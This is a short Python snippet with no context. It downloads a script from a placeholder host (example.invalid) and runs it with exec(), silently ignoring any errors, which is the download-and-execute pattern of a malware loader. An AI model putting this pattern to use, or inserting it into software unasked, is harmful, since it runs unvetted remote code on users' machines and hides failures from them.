import requests
try:
    source = requests.get('https://example.invalid/script').text
    exec(source)
except Exception:
    pass
